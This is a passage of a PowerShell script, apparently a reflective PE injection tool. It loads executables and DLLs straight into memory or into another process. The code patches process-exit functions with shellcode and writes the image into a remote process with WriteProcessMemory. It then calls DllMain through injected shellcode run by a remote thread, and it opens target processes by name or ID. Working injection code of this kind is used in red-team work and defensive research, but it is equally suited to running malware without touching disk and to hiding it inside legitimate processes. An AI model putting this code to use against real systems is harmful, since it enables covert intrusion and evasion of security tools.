                [IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
                if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
                {
                    "Error, couldn't find _wcmdln or _acmdln"
                }
                
                $NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
                $NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
                
                #Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
                $OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
                $OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
                $OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                $OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
                $ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
                $ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
                
                $Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
                
                $Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
            }
        }
        #################################################
        
        
        #################################################
        #Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

        $ReturnArray = @()
        $ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
        
        #CorExitProcess (compiled in to visual studio c++)
        [IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
        if ($MscoreeHandle -eq [IntPtr]::Zero)
        {
            throw "mscoree handle null"
        }
        [IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
        if ($CorExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "CorExitProcess address not found"
        }
        $ExitFunctions += $CorExitProcessAddr
        
        #ExitProcess (what non-managed programs use)
        [IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
        if ($ExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "ExitProcess address not found"
        }
        $ExitFunctions += $ExitProcessAddr
        
        [UInt32]$OldProtectFlag = 0
        foreach ($ProcExitFunctionAddr in $ExitFunctions)
        {
            $ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
            #The following is the shellcode (Shellcode: ExitThread.asm):
            #32bit shellcode
            [Byte[]]$Shellcode1 = @(0xbb)
            [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
            #64bit shellcode (Shellcode: ExitThread.asm)
            if ($PtrSize -eq 8)
            {
                [Byte[]]$Shellcode1 = @(0x48, 0xbb)
                [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
            }
            [Byte[]]$Shellcode3 = @(0xff, 0xd3)
            $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
            
            [IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
            if ($ExitThreadAddr -eq [IntPtr]::Zero)
            {
                Throw "ExitThread address not found"
            }

            $Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }
            
            #Make copy of original ExitProcess bytes
            $ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
            $Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
            $ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
            
            #Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then
            # call ExitThread
            Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

            $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
        #################################################

        Write-Output $ReturnArray
    }
    
    
    #This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
    # It copies Count bytes from Source to Destination.
    Function Copy-ArrayOfMemAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Array[]]
        $CopyInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        [UInt32]$OldProtectFlag = 0
        foreach ($Info in $CopyInfo)
        {
            $Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }
            
            $Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
            
            $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
    }


    #####################################
    ########## FUNCTIONS ###########
    #####################################
    Function Get-MemoryProcAddress
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FunctionName
        )
        
        $Win32Types = Get-Win32Types
        $Win32Constants = Get-Win32Constants
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        
        #Get the export table
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
        {
            return [IntPtr]::Zero
        }
        $ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
        $ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
        
        for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
        {
            #AddressOfNames is an array of pointers to strings of the names of the functions exported
            $NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
            $NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
            $Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

            if ($Name -ceq $FunctionName)
            {
                #AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
                # which contains the offset of the function in to the DLL
                $OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
                $FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
                $FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
                $FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
                return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
            }
        }
        
        return [IntPtr]::Zero
    }


    Function Invoke-MemoryLoadLibrary
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $false)]
        [String]
        $ExeArgs,
        
        [Parameter(Position = 2, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
        )
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        
        #Get Win32 constants and functions
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        
        $RemoteLoading = $false
        if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $RemoteLoading = $true
        }
        
        #Get basic PE information
        Write-Verbose "Getting basic PE information from the file"
        $PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
        $OriginalImageBase = $PEInfo.OriginalImageBase
        $NXCompatible = $true
        if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
        {
            Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
            $NXCompatible = $false
        }
        
        
        #Verify that the PE and the current process are the same bits (32bit or 64bit)
        $Process64Bit = $true
        if ($RemoteLoading -eq $true)
        {
            $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
            $Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
            if ($Result -eq [IntPtr]::Zero)
            {
                Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
            }
            
            [Bool]$Wow64Process = $false
            $Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
            if ($Success -eq $false)
            {
                Throw "Call to IsWow64Process failed"
            }
            
            if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
            {
                $Process64Bit = $false
            }
            
            #PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
            $PowerShell64Bit = $true
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $PowerShell64Bit = $false
            }
            if ($PowerShell64Bit -ne $Process64Bit)
            {
                throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
            }
        }
        else
        {
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $Process64Bit = $false
            }
        }
        if ($Process64Bit -ne $PEInfo.PE64Bit)
        {
            Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
        }
        

        #Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
        Write-Verbose "Allocating memory for the PE and write its headers to memory"
        
        #ASLR check
        [IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
        if ((-not $ForceASLR) -and (-not $PESupportsASLR))
        {
            Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
            [IntPtr]$LoadAddr = $OriginalImageBase
        }
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
            Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

        $PEHandle = [IntPtr]::Zero                #This is where the PE is allocated in PowerShell
        $EffectivePEHandle = [IntPtr]::Zero        #This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
        if ($RemoteLoading -eq $true)
        {
            #Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
            $PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            
            #todo, error handling needs to delete this memory if an error happens along the way
            $EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($EffectivePEHandle -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
            }
        }
        else
        {
            if ($NXCompatible -eq $true)
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            }
            else
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            }
            $EffectivePEHandle = $PEHandle
        }
        
        [IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
        if ($PEHandle -eq [IntPtr]::Zero)
        { 
            Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
        }        
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
        
        
        #Now that the PE is in memory, get more detailed information about it
        Write-Verbose "Getting detailed PE information from the headers loaded in memory"
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
        $PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
        Write-Verbose "StartAddress: $(Get-Hex $PEHandle) EndAddress: $(Get-Hex $PEEndAddress)"
        
        
        #Copy each section from the PE in to memory
        Write-Verbose "Copy PE sections in to memory"
        Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
        
        
        #Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
        Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
        Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

        
        #The PE we are in-memory loading has DLLs it needs, import those DLLs for it
        Write-Verbose "Import DLL's needed by the PE we are loading"
        if ($RemoteLoading -eq $true)
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
        }
        else
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
        }
        
        
        #Update the memory protection flags for all the memory just allocated
        if ($RemoteLoading -eq $false)
        {
            if ($NXCompatible -eq $true)
            {
                Write-Verbose "Update memory protection flags"
                Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
            }
            else
            {
                Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
            }
        }
        else
        {
            Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
        }
        
        
        #If remote loading, copy the DLL in to remote process memory
        if ($RemoteLoading -eq $true)
        {
            [UInt32]$NumBytesWritten = 0
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw "Unable to write shellcode to remote process memory."
            }
        }
        
        
        #Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
        if ($PEInfo.FileType -ieq "DLL")
        {
            if ($RemoteLoading -eq $false)
            {
                Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
                $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
                $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
                $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
                
                $DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
            }
            else
            {
                $DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            
                if ($PEInfo.PE64Bit -eq $true)
                {
                    #Shellcode: CallDllMain.asm
                    $CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                }
                else
                {
                    #Shellcode: CallDllMain.asm
                    $CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
                }
                $SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
                $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
                $SCPSMemOriginal = $SCPSMem
                
                Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
                
                $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                if ($RSCAddr -eq [IntPtr]::Zero)
                {
                    Throw "Unable to allocate memory in the remote process for shellcode"
                }
                
                $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
                if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
                {
                    Throw "Unable to write shellcode to remote process memory."
                }

                $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
                $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
                if ($Result -ne 0)
                {
                    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
                }
                
                $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            }
        }
        elseif ($PEInfo.FileType -ieq "EXE")
        {
            #Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
            [IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
            [System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
            $OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

            #If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
            # This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
            [IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

            $Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

            while($true)
            {
                [Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
                if ($ThreadDone -eq 1)
                {
                    Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
                    Write-Verbose "EXE thread has completed."
                    break
                }
                else
                {
                    Start-Sleep -Seconds 1
                }
            }
        }
        
        return @($PEInfo.PEHandle, $EffectivePEHandle)
    }
    
    
    Function Invoke-MemoryFreeLibrary
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $PEHandle
        )
        
        #Get Win32 constants and functions
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        
        #Call FreeLibrary for all the imports of the DLL
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
                
                #If the structure is null, it signals that this is the end of the array
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done unloading the libraries needed by the PE"
                    break
                }

                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
                $ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

                if ($ImportDllHandle -eq $null)
                {
                    Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
                }
                
                $Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
                if ($Success -eq $false)
                {
                    Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
                }
                
                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
        
        #Call DllMain with process detach
        Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
        $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
        $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
        $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
        
        $DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
        
        
        $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
        if ($Success -eq $false)
        {
            Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
        }
    }


    Function Main
    {
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        $Win32Constants =  Get-Win32Constants
        
        $RemoteProcHandle = [IntPtr]::Zero
    
        #If a remote process to inject in to is specified, get a handle to it
        if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
        {
            Throw "Can't supply a ProcId and ProcName, choose one or the other"
        }
        elseif ($ProcName -ne $null -and $ProcName -ne "")
        {
            $Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
            if ($Processes.Count -eq 0)
            {
                Throw "Can't find process $ProcName"
            }
            elseif ($Processes.Count -gt 1)
            {
                $ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
                Write-Output $ProcInfo
                Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
            }
            else
            {
                $ProcId = $Processes[0].ID
            }
        }
        
        #Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
        #If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
# if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
# {
# Write-Verbose "Getting SeDebugPrivilege"
# Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
# }
        
        if (($ProcId -ne $null) -and ($ProcId -ne 0))
        {
            $RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
            if ($RemoteProcHandle -eq [IntPtr]::Zero)
            {
                Throw "Couldn't obtain the handle for process ID: $ProcId"
            }
            
            Write-Verbose "Got the handle for the remote process to inject in to"
        }
        

        #Load the PE reflectively
        Write-Verbose "Calling Invoke-MemoryLoadLibrary"
        $PEHandle = [IntPtr]::Zero
        if ($RemoteProcHandle -eq [IntPtr]::Zero)
        {
